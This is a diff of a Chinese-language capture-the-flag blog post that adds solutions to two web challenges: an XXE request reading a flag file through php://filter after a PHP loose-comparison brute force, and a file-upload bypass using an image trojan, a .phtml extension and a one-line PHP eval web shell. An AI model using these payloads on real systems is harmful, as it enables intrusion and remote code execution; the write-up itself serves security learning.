@@ -65,7 +65,9 @@
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;26&#x2F;Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1572099090928.png">
 <meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;26&#x2F;Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1572100049777.png">
-<meta property="og:updated_time" content="2019-10-28T12:36:44.281Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;26&#x2F;Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1572445819157.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;26&#x2F;Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1572446836898.png">
+<meta property="og:updated_time" content="2019-10-30T14:55:15.962Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;li1m.github.io&#x2F;2019&#x2F;10&#x2F;26&#x2F;Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3&#x2F;1572099090928.png">
   <link rel="canonical" href="https://li1m.github.io/2019/10/26/Syc%20Geek%2010th%20web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">
@@ -294,7 +296,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2019-10-28 20:36:44" itemprop="dateModified" datetime="2019-10-28T20:36:44+08:00">2019-10-28</time>
+                <time title="Modified: 2019-10-30 22:55:15" itemprop="dateModified" datetime="2019-10-30T22:55:15+08:00">2019-10-30</time>
               </span>
             
           
@@ -316,7 +318,7 @@
               
                 <span class="post-meta-item-text">Symbols count in article: </span>
               
-              <span>2.5k</span>
+              <span>4.1k</span>
             </span>
           
             <span class="post-meta-item" title="Reading time">
@@ -326,7 +328,7 @@
               
                 <span class="post-meta-item-text">Reading time &asymp;</span>
               
-              <span>2 mins.</span>
+              <span>4 mins.</span>
             </span>
           
 
@@ -380,10 +382,25 @@
 <p>查看源码发现一个href标签，又是一个超链接，不过是黑色的，页面ctrl+a可以看见，点开链接，发现一个302重定向action.php ，抓包看一下，提示secr3t.php，打开secr3t.php，是一个文件包含，说flag在flag.php，用php伪协议读一下，base64解码可得flag。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
 
+<p>11.性感黄阿姨，在线聊天 </p>
+<p>题目提示xxe，php弱类型。XXE全称是——XML External Entity，也就是XML外部实体注入攻击。</p>
+<p>打开题目是一个聊天界面，输入flag，它说只是guest用户，抓包看一下请求报文，发现传输的数据是json数据(JSON(JavaScript Object Notation)是一种轻量级的数据交换格式)name:”guest”，将name改为admin，看到要满足$name==md5($flag)，然后进行下一步，这里就要用到php弱类型，==是比较运算符号，不会检查条件式的表达式的类型，在比较字符串和整型时会将字符串转化为整型，如123adas123sda会变成123，省略字母后的字符.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="number">123</span>;</span><br><span class="line">$b=<span class="string">'123ads123dasd'</span>;</span><br><span class="line">var_dump($a==$b);	<span class="comment">//运行结果为bool(true)</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破name，name从0~xxxxx，name为数字，因为md5($flag)后为字符类型，里面含有数字，字母，和整型比较会除去字母后面字符只保留数字进行比较。爆出结果name为357，告诉了flag在<em>_f14g_Is_Here</em>.php，所以用xxe读取这个文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /message.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">148.70</span><span class="number">.59</span><span class="number">.198</span>:<span class="number">41257</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">70.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">70.0</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Content-Type: application/xml</span></span><br><span class="line"><span class="comment">Content-Length: 201</span></span><br><span class="line"><span class="comment">Origin: http://148.70.59.198:41257</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Referer: http://148.70.59.198:41257/</span></span><br><span class="line"><span class="comment">Cookie: td_cookie=195560425</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="comment">&lt;!DOCTYPE root[</span></span><br><span class="line"><span class="comment">&lt;!ENTITY xxe SYSTEM</span></span><br><span class="line"><span class="comment"> "php://filter/read=convert.base64-encode/resource=_f14g_Is_Here_.php"&gt;</span></span><br><span class="line"><span class="comment">]&gt;</span></span><br><span class="line"><span class="comment">&lt;root&gt;</span></span><br><span class="line"><span class="comment">	&lt;name&gt;&amp;xxe;&lt;/name&gt;</span></span><br><span class="line"><span class="comment"> 	&lt;request&gt;flag&lt;/request&gt;</span></span><br><span class="line"><span class="comment">&lt;/root&gt;</span></span><br></pre></td></tr></table></figure>
 
 
 
+<p><img src="1572445819157.png" alt="1572445819157"></p>
+<p>文件内容以base64编码形式读出，解码可得flag。</p>
+<p>12.你有特洛伊么</p>
+<p>这个是文件上传，文件上传肯定做了些限制，慢慢看一下，发现是黑名单的验证，还验证了文件的内容，要包含图片格式，并且内容不能含有&lt;?，黑名单的验证其实比较好绕，用copy 1.jpg/b+1.php/a 1.jpg(文件包含解析b表示二进制，a表示ascii码)做一个图片马，但是内容不能含有&lt;?，那么怎么表示这是php文件呢，查了一下发现还可以这样表示为php文件，但是这种表示方法在php7已经不适用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
+<p>接下来就是找一个不在黑名单，但可以解析的后缀名，发现.phtml没有过滤，且可以解析，上传该文件。</p>
+<p><img src="1572446836898.png" alt="1572446836898"></p>
+<p>最后读取文件，菜刀连接即可找到flag。</p>
 
     </div>
 
@@ -531,14 +548,14 @@
     </span>
       <span class="post-meta-item-text">Symbols count total: </span>
     
-    <span title="Symbols count total">8k</span>
+    <span title="Symbols count total">9k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">Reading time total &asymp;</span>
     
-    <span title="Reading time total">7 mins.</span>
+    <span title="Reading time total">8 mins.</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.0.0
   </div>
